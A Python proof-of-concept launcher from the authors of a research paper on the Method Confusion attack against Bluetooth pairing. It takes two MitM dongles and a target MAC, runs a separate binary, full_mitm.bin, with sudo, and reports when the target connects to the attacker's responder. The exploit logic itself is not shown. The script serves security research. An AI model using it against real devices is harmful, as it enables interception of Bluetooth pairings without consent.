#!/usr/bin/env python3
# POC of end2end attack for the paper "Method Confusion Attack on the Bluetooth Pairing Process"
# By maxdos & lupinglui

import sys
import os
import subprocess
import select
import threading
import time
import re
import signal
import pathlib
from binascii import hexlify, unhexlify
import argparse

AUTO_BINARY_PATH = str(pathlib.Path(__file__).parent.resolve()) + "/full_mitm.bin"
SLEEP_TIME_BETWEEN_PACKET_PROCESSING = 0.01
PATTERN_POSITION_MAC = 2

# Globals
current_target_addr = None
sniffer = None
sniffing = True
sniffer_mutex = threading.Lock()
pattern_position = None

# Helper functions
def is_valid_mac(arg_value, pat=re.compile(r"[0-9a-f]{2}:([0-9a-f]{2}:){4}[0-9a-f]{2}$")):
    """ Checks if arg_value is a valid MAC e.g Aa:12:aa:bb:aa:ff and returns lowercased string """
    if not pat.match(arg_value.lower()):
        raise argparse.ArgumentTypeError
    return arg_value.lower()

def main():
    """ Main routine """
    global sniffer
    global current_target_addr
    global pattern_postition

    parser = argparse.ArgumentParser(description='Method Confusion BLE attack tool.')
    parser.add_argument('-i', '--initiator', dest='init_dev_num', type=str, required=True, default=None, help='lsusb number of MitM initiator device')
    parser.add_argument('-r', '--responder', dest='resp_dev_num', type=str, required=True, default=None, help='lsusb number of MitM responder device')
    parser.add_argument('-m', '--target-mac', dest='target_mac', type=is_valid_mac, required=True, default=None, help='MAC address of the target (if no target mac and no target pattern is provided BLE scanning will be initiated)')

    args = parser.parse_args()

    if args.init_dev_num and args.resp_dev_num and args.target_mac:
        print(args.init_dev_num, args.resp_dev_num)
    else:
        parser.print_help()

    if(args.target_mac is not None):
        args.target_pattern = bytes.fromhex(args.target_mac.replace(":","")[::-1])
        args.pattern_position = PATTERN_POSITION_MAC
        current_target_addr = args.target_mac

    if not os.path.isfile(AUTO_BINARY_PATH):
        print("File does not exist:", AUTO_BINARY_PATH)
    attack_process = subprocess.Popen(["sudo", AUTO_BINARY_PATH, args.init_dev_num, args.resp_dev_num, "SBLEEDY", current_target_addr], stdout=subprocess.PIPE, stdin=subprocess.PIPE)

    while True:
        result = attack_process.stdout.readline()

        if len(result) < 1:
            continue
        print(result)

        if(b"RESP: Connection complete" in result):
            print("Target has connected to MitM responder")

if __name__ == "__main__":
    main()
